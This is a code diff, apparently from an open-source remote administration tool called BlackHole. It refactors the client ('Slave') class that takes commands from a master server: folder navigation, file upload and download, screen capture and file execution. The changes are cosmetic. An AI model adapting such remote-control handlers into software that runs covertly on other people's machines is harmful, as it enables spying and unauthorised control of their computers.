@@ -3,8 +3,6 @@ using System.Collections.Concurrent;
 using System.Diagnostics;
 using System.IO;
 using System.Net;
-using System.Threading;
-using System.Threading.Tasks;
 using BlackHole.Common;
 using BlackHole.Common.Network.Protocol;
 using BlackHole.Slave.Helper;
@@ -20,9 +18,8 @@ namespace BlackHole.Slave
     /// </summary>
     public sealed class MasterServer : Singleton<MasterServer>
     {
-        public const int DISCONNECTION_TIMEOUT = 8000;
-        public const int SEND_INTERVAL = 10;
-        public const int RECEIVE_INTERVAL = 10;
+        private const int DISCONNECTION_TIMEOUT = 8000;
+        private const int SEND_INTERVAL = 10;
         
         private readonly Stopwatch m_receiveTimer;
         private readonly NetMQSocket m_client;
@@ -83,10 +80,10 @@ namespace BlackHole.Slave
         /// <param name="e"></param>
         private void SendQueue(object sender, NetMQTimerEventArgs e)
         {
-            NetMQMessage message;
             var i = m_sendQueue.Count;
             while (i > 0)
             {
+                NetMQMessage message;
                 if (m_sendQueue.TryDequeue(out message))
                     m_client.TrySendMultipartMessage(message);
                 i--;
@@ -149,7 +146,7 @@ namespace BlackHole.Slave
             var message = NetMessage.Deserialize(frames[0].Buffer);
             message.Match()
                 .With<DoYourDutyMessage>(DoYourDuty)
-                .With<PingMessage>(Ping)
+                .With<PingMessage>(m => Send(new PongMessage()))
                 .With<NavigateToFolderMessage>(NavigateToFolder)
                 .With<DownloadFilePartMessage>(DownloadFilePart)
                 .With<UploadFileMessage>(UploadFile)
@@ -157,10 +154,7 @@ namespace BlackHole.Slave
                 .With<StartScreenCaptureMessage>(ScreenCapture.Instance.StartScreenCapture)
                 .With<StopScreenCaptureMessage>(ScreenCapture.Instance.StopScreenCapture)
                 .With<ExecuteFileMessage>(ExecuteFile)
-                .Default(m =>
-                {
-                    SendFailedStatus(message.WindowId, "Message parsing", $"Unknow message {m.GetType().Name}");
-                });
+                .Default(m => SendFailedStatus(message.WindowId, "Message parsing", $"Unknow message {m.GetType().Name}"));
 
 #if DEBUG
             if(message.GetType() != typeof(PingMessage))
@@ -172,22 +166,27 @@ namespace BlackHole.Slave
         /// <summary>
         /// 
         /// </summary>
+        /// <param name="operationId"></param>
         /// <param name="operation"></param>
-        /// <param name="message"></param>
+        /// <param name="windowId"></param>
+        /// <param name="exception"></param>
         public void SendStatus(int windowId, long operationId, string operation, Exception exception) => 
             SendStatus(windowId, operationId, operation, false, "Failed : " +  exception);
 
         /// <summary>
         /// 
         /// </summary>
+        /// <param name="operationId"></param>
         /// <param name="operation"></param>
         /// <param name="message"></param>
+        /// <param name="windowId"></param>
         public void SendStatus(int windowId, long operationId, string operation, string message) => 
             SendStatus(windowId, operationId, operation, true, message);
 
         /// <summary>
         /// 
         /// </summary>
+        /// <param name="windowId"></param>
         /// <param name="operation"></param>
         /// <param name="message"></param>
         public void SendStatus(int windowId, string operation, string message) => 
@@ -196,6 +195,7 @@ namespace BlackHole.Slave
         /// <summary>
         /// 
         /// </summary>
+        /// <param name="windowId"></param>
         /// <param name="operation"></param>
         /// <param name="message"></param>
         public void SendFailedStatus(int windowId, string operation, string message) => 
@@ -232,15 +232,6 @@ namespace BlackHole.Slave
         /// <summary>
         /// 
         /// </summary>
-        /// <param name="message"></param>
-        private void Ping(PingMessage message)
-        {
-            Send(new PongMessage());
-        }
-
-        /// <summary>
-        /// 
-        /// </summary>
         /// <param name="windowId"></param>
         /// <param name="operationId"></param>
         /// <param name="operationName"></param>
@@ -269,16 +260,18 @@ namespace BlackHole.Slave
         /// <param name="messageBuilder"></param>
         public void ExecuteSimpleOperation<T>(int windowId, string operationName,
             Func<T> operation, Func<T, string> messageBuilder) where T : NetMessage
-            => ExecuteComplexSendOperation(windowId, operationName, operation, message =>
+        {
+            ExecuteComplexSendOperation(windowId, operationName, operation, message =>
                 SendStatus(windowId, -1, operationName, "Success : " + messageBuilder(message)));
+        }
 
         /// <summary>
         /// 
         /// </summary>
         /// <typeparam name="T"></typeparam>
+        /// <param name="windowId"></param>
         /// <param name="operationName"></param>
         /// <param name="operation"></param>
-        /// <param name="success"></param>
         public void ExecuteComplexSendOperation<T>(int windowId, string operationName, Func<T> operation) where T : NetMessage
             => ExecuteComplexSendOperation(windowId, operationName, operation, x => { });
 
@@ -286,6 +279,7 @@ namespace BlackHole.Slave
         /// 
         /// </summary>
         /// <typeparam name="T"></typeparam>
+        /// <param name="windowId"></param>
         /// <param name="operationName"></param>
         /// <param name="operation"></param>
         /// <param name="success"></param>
@@ -335,7 +329,7 @@ namespace BlackHole.Slave
                 part =>
                 {
                     if (part.CurrentPart == part.TotalPart)
-                        SendStatus(message.WindowId, message.Id, "File download", "Successfully downloaded : " + part.Path);
+                        SendStatus(message.WindowId, message.Id, "File download", "Successfully downloaded: " + part.Path);
                 });
         }
 
